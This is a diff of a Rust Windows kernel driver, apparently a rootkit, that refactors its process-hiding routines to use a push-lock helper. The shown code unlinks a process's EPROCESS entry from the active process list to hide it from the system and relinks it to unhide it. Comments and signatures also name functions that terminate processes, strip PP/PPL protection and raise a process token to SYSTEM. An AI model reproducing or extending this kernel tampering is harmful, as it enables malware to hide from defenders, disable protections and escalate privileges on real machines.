@@ -4,7 +4,8 @@ use {
     alloc::{boxed::Box, vec::Vec}, 
     core::sync::atomic::{AtomicPtr, Ordering},
     shared::{
-        vars::{MAX_PIDS, Options},
+        vars::MAX_PIDS,
+        enums::Options,
         structs::{
             HiddenProcessInfo , ProcessListInfo, TargetProcess, 
             ProcessInfoHide, ProcessSignature, LIST_ENTRY, 
@@ -12,16 +13,22 @@ use {
         }, 
     }, 
     crate::{
-        includes::structs::PROCESS_SIGNATURE,
-        utils::offsets::{get_offset_signature, get_offset_token, get_offset_unique_process_id},
+        internals::structs::PROCESS_SIGNATURE,
+        utils::{
+            offsets::{
+                get_offset_signature, get_offset_token, 
+                get_offset_unique_process_id
+            },
+            with_push_lock_exclusive
+        },
     }, 
 };
 
 #[cfg(not(feature = "mapper"))]
 pub mod callback;
-pub mod ioctls;
 #[cfg(not(feature = "mapper"))]
 pub use callback::*;
+pub mod ioctls;
 
 /// List of target processes protected by a mutex.
 pub static PROCESS_INFO_HIDE: Lazy<Mutex<Vec<HiddenProcessInfo>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PIDS))); 
@@ -36,9 +43,11 @@ impl Process {
     /// Creates a new `Process` instance by looking up a process by its PID.
     ///
     /// # Parameters
+    /// 
     /// - `pid`: The process identifier (PID) to look up.
     ///
     /// # Returns
+    /// 
     /// - `Option<Self>`: Returns `Some(Self)` if the process lookup is successful, otherwise `None`.
     ///
     #[inline]
@@ -57,9 +66,11 @@ impl Process {
     /// Toggle the visibility of a process based on the `enable` field of the `TargetProcess` structure.
     ///
     /// # Parameters
+    /// 
     /// - `process`:  A pointer to the `TargetProcess` structure.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn process_toggle(process: *mut ProcessInfoHide) -> NTSTATUS {
@@ -74,9 +85,11 @@ impl Process {
     /// Hide a process by removing it from the list of active processes.
     ///
     /// # Parameters
+    /// 
     /// - `process`: The identifier of the target process (PID) to be hidden.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     unsafe fn hide_process(pid: usize) -> Result<(), NTSTATUS> {
@@ -91,42 +104,41 @@ impl Process {
         let list_entry = process.e_process.cast::<u8>().offset(active_process_link_list) as PLIST_ENTRY;
         let push_lock = process.e_process.cast::<u8>().offset(process_lock) as *mut u64;
 
-        ExAcquirePushLockExclusiveEx(push_lock, 0);
-
-        let next = (*list_entry).Flink; // Process (3)
-        let previous = (*list_entry).Blink; // Process (1)
-        let list = LIST_ENTRY {
-            Flink: next as *mut LIST_ENTRY,
-            Blink: previous as *mut LIST_ENTRY,
-        };
-
-        let mut process_info = PROCESS_INFO_HIDE.lock();
-        let list_ptr = Box::into_raw(Box::new(list));
-
-        process_info.push(HiddenProcessInfo  {
-            pid,
-            list_entry: AtomicPtr::new(list_ptr),
-        });
-
-        (*next).Blink = previous;
-        (*previous).Flink = next;
-
-        (*list_entry).Flink = list_entry;
-        (*list_entry).Blink = list_entry;
-
-        log::info!("Process with PID {pid} hidden successfully.");
-
-        ExReleasePushLockExclusiveEx(push_lock, 0);
-
-        Ok(())
+        with_push_lock_exclusive(push_lock, || {
+            let next = (*list_entry).Flink; // Process (3)
+            let previous = (*list_entry).Blink; // Process (1)
+            let list = LIST_ENTRY {
+                Flink: next as *mut LIST_ENTRY,
+                Blink: previous as *mut LIST_ENTRY,
+            };
+    
+            let mut process_info = PROCESS_INFO_HIDE.lock();
+            let list_ptr = Box::into_raw(Box::new(list));
+    
+            process_info.push(HiddenProcessInfo  {
+                pid,
+                list_entry: AtomicPtr::new(list_ptr),
+            });
+    
+            (*next).Blink = previous;
+            (*previous).Flink = next;
+    
+            (*list_entry).Flink = list_entry;
+            (*list_entry).Blink = list_entry;
+                    
+            log::info!("Process with PID {pid} hidden successfully.");
+            Ok(())
+        })
     }
 
     /// Unhide a process by removing it from the list of active processes.
     ///
     /// # Parameters
+    /// 
     /// - `process`: The identifier of the target process (PID) to be hidden.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     unsafe fn unhide_process(pid: usize) -> Result<(), NTSTATUS> {
@@ -141,48 +153,47 @@ impl Process {
         let list_entry = process.e_process.cast::<u8>().offset(active_process_link_list) as PLIST_ENTRY;
         let push_lock = process.e_process.cast::<u8>().offset(process_lock) as PULONG_PTR;
 
-        ExAcquirePushLockExclusiveEx(push_lock, 0);
+        with_push_lock_exclusive(push_lock, || {
+            // Restoring Flink / Blink
+            let mut process_info = PROCESS_INFO_HIDE.lock();
+            if let Some(index) = process_info.iter().position(|p| p.pid == pid) {
+                let process = &process_info[index];
+                let list = process.list_entry.load(Ordering::SeqCst);
+                if list.is_null() {
+                    log::error!("List entry stored in AtomicPtr is null");
+                    return Err(STATUS_INVALID_PARAMETER);
+                }
 
-        // Restoring Flink / Blink
-        let mut process_info = PROCESS_INFO_HIDE.lock();
-        if let Some(index) = process_info.iter().position(|p| p.pid == pid) {
-            let process = &process_info[index];
-            let list = process.list_entry.load(Ordering::SeqCst);
-            if list.is_null() {
-                log::error!("List entry stored in AtomicPtr is null");
-                return Err(STATUS_INVALID_PARAMETER);
+                (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
+                (*list_entry).Blink = (*list).Blink as *mut _LIST_ENTRY;
+
+                let next = (*list_entry).Flink; // Processo (3)
+                let previous = (*list_entry).Blink; // Processo (1)
+
+                (*next).Blink = list_entry;
+                (*previous).Flink = list_entry;
+
+                process_info.remove(index);
+                log::info!("Process with PID {pid} unhidden successfully.");
+
+                Ok(())
+            } else {
+                log::info!("PID ({pid}) Not found");
+                Err(STATUS_UNSUCCESSFUL)
             }
-
-            (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
-            (*list_entry).Blink = (*list).Blink as *mut _LIST_ENTRY;
-
-            let next = (*list_entry).Flink; // Processo (3)
-            let previous = (*list_entry).Blink; // Processo (1)
-
-            (*next).Blink = list_entry;
-            (*previous).Flink = list_entry;
-
-            process_info.remove(index);
-        } else {
-            log::info!("PID ({pid}) Not found");
-            ExReleasePushLockExclusiveEx(push_lock, 0);
-            return Err(STATUS_UNSUCCESSFUL);
-        }
-
-        log::info!("Process with PID {pid} unhidden successfully.");
-        ExReleasePushLockExclusiveEx(push_lock, 0);
-
-        Ok(())
+        })
     }
 
     /// Toggles the enumeration between hiding or protecting processes based on the options provided.
     ///
     /// # Parameters
+    /// 
     /// - `input_target`: Pointer to the enumeration information input structure.
     /// - `info_process`: Information structure of processes.
     /// - `information`: Pointer to a variable to store information size.
     ///
     /// # Returns
+    /// 
     /// - `NTSTATUS`: Status of the operation. `STATUS_SUCCESS` if successful, `STATUS_UNSUCCESSFUL` otherwise.
     /// 
     pub unsafe fn enumerate_process_toggle(input_target: *mut EnumerateInfoInput, info_process: *mut ProcessListInfo, information: &mut usize) -> NTSTATUS {
@@ -204,10 +215,12 @@ impl Process {
     /// Enumerate Processes Hide.
     ///
     /// # Parameters
+    /// 
     /// - `info_process`: It is a parameter of type `ProcessListInfo` that will send the processes that are currently hidden.
     /// - `information`: It is a parameter of type `usize` that will be updated with the total size of the filled `ProcessListInfo` structures.
     /// 
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     unsafe fn enumerate_hide_processes(info_process: *mut ProcessListInfo, information: &mut usize) -> NTSTATUS {
@@ -226,9 +239,11 @@ impl Process {
     /// Terminate a process specified by the PID (Process Identifier).
     ///
     /// # Parameters
+    /// 
     /// - `pid`: The identifier of the target process (PID) to terminate process.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn terminate_process(process: *mut TargetProcess) -> NTSTATUS {
@@ -268,9 +283,11 @@ impl Process {
     /// Removing process signature (PP / PPL).
     ///
     /// # Parameters
+    /// 
     /// - `pid`: The identifier of the target process (PID) to remove protection.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn protection_signature(signature_info: *mut ProcessSignature) -> Result<(), NTSTATUS> {
@@ -301,9 +318,11 @@ impl Process {
     /// to those of the system (NT AUTHORITY\SYSTEM).
     ///
     /// # Parameters
+    /// 
     /// - `pid`: The identifier of the target process (PID) whose token will be raised.
     ///
-    /// # Return
+    /// # Returns
+    /// 
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
     pub unsafe fn elevate_process(process: *mut TargetProcess) -> Result<(), NTSTATUS> {
